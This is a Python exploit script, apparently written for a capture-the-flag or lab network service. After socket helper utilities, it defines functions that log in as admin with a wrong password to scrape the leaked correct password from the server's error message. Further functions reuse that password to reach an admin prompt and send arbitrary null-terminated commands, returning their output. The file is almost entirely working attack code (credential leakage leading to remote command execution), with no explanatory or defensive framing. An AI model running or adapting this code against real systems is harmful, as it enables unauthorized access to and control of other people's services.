import re
import socket
import time


TIMEOUT = 3


class BufferedSocket:
    def __init__(self, sock):
        self.sock = sock
        self.buf = bytearray()

    def recv_until(self, token, timeout=TIMEOUT):
        end = time.time() + timeout
        while token not in self.buf:
            if time.time() > end:
                raise TimeoutError(f"wait {token!r} timeout")
            remaining = max(0.1, end - time.time())
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("remote closed")
            self.buf.extend(chunk)

        pos = self.buf.find(token) + len(token)
        data = bytes(self.buf[:pos])
        del self.buf[:pos]
        return data

    def recv_some(self, timeout=0.2):
        data = bytearray(self.buf)
        self.buf.clear()

        self.sock.settimeout(timeout)
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data.extend(chunk)
            if len(chunk) < 4096:
                break
        return bytes(data)

    def send_line(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data + b"\n")

    def send_raw(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data)

    def close(self):
        self.sock.close()


def recv_some(sock, timeout=0.2):
    if hasattr(sock, "recv_some"):
        return sock.recv_some(timeout)
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
        if len(data) < 4096:
            break
    return b"".join(chunks)


def recv_until(sock, token, timeout=TIMEOUT):
    if hasattr(sock, "recv_until"):
        return sock.recv_until(token, timeout)
    sock.settimeout(timeout)
    data = b""
    end = time.time() + timeout
    while token not in data:
        if time.time() > end:
            raise TimeoutError(f"wait {token!r} timeout")
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("remote closed")
        data += chunk
    return data


def send_line(sock, data):
    if hasattr(sock, "send_line"):
        sock.send_line(data)
        return
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + b"\n")


def send_raw(sock, data):
    if hasattr(sock, "send_raw"):
        sock.send_raw(data)
        return
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data)


def connect(host, port, timeout=TIMEOUT):
    return BufferedSocket(socket.create_connection((host, port), timeout=timeout))


def choose_admin(sock):
    recv_until(sock, b"2.login admin\n> ", TIMEOUT)
    send_line(sock, "2")


def login(sock, password):
    recv_until(sock, b"Enter admin name:\n> ", TIMEOUT)
    send_line(sock, "admin")
    recv_until(sock, b"Enter admin password:\n> ", TIMEOUT)
    send_line(sock, password)


def leak_password(sock):
    choose_admin(sock)
    login(sock, "12345")
    data = recv_until(sock, b"The correct password is: ", TIMEOUT)
    data += recv_until(sock, b"\n", TIMEOUT)
    match = re.search(rb"The correct password is:\s*([0-9A-Za-z]+)", data)
    if not match:
        raise ValueError(f"password leak failed: {data!r}")
    return match.group(1).decode()


def run_cmd(sock, password, cmd):
    choose_admin(sock)
    login(sock, password)
    data = recv_until(sock, b"Enter your command:", TIMEOUT)
    send_raw(sock, cmd.encode() + b"\x00")
    data += recv_some(sock, 1.0)
    return data


def run_cmd_new_conn(host, port, password, cmd):
    sock = connect(host, port)
    try:
        return run_cmd(sock, password, cmd)
    finally:
        sock.close()
